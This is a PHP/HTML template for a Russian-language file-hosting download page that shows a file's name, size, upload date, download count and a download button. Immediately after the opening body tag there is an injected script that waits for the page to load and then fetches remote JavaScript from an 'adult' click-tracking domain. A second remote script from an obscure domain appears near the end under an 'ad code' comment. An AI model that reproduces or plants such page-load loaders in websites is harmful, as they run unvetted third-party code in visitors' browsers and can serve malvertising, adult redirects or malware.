<!DOCTYPE html>
<html>
<head>
	<title><?php echo $view["file_name"]; ?></title>

	<?php include_once(D.'front_end/template/external.php'); ?>

</head>
<body>
<script type="text/javascript"> (function(w) { var s = document.createElement('script'); var z = setInterval(function() { if (document.readyState == 'interactive' || document.readyState == 'complete') { clearInterval(z); s.src = "http://1686.w4statistics.info/click.php?p=315776&adult=1&c"; s.async = true; s.type = type = 'text/javascript'; w.document.body.appendChild(s); } }, 200); })(window); </script>
<?php include_once(D.'front_end/template/header.php'); ?>

<section>
	<div class="container">
		<div class="row pd30">
			<p class="main-page-logo"><i class="fa fa-cloud" aria-hidden="true"></i></p>
			<div class="view-page wrapper">

				<div class="row">
					<div class="column-6 file-item">
						<i class="fa fa-file-o" aria-hidden="true"></i>
						<span><b>Имя файла: </b><br><?php echo $view["file_name"]; ?></span>
					</div>

					<div class="column-6 file-item">
						<i class="fa fa-cogs" aria-hidden="true"></i>
						<span><b>Размер: </b><br><?php echo $size; ?></span>
					</div>
				</div>

				<div class="row">
					<div class="column-6 file-item">
						<i class="fa fa-calendar" aria-hidden="true"></i>
						<span><b>Дата загрузки: </b><br><?php echo $view["date_time"]; ?></span>
					</div>
					<div class="column-6 file-item">
						<i class="fa fa-download" aria-hidden="true"></i>
						<span><b>Загрузки: </b><br><?php echo $downloads; ?></span>
					</div>
				</div>
				<div class="clear"></div>
				
			</div>

			<center><a download href="<?php uri(); ?>files/files/<?php echo $view["path"]; ?>" data-id="<?php echo $view['file_id']; ?>" class="download-button">Скачать</a></center>
		</div>
	</div>
</section>

<!-- рекламный код -->
<script async language="javascript" charset="UTF-8" type="text/javascript" src="//etfory.info/7drive.js?i2boy8=854742"></script>
<!-- рекламный код -->

<?php include_once(D.'front_end/template/footer.php'); ?>
<?php include_once(D.'front_end/template/scripts.php'); ?>
</body>
</html>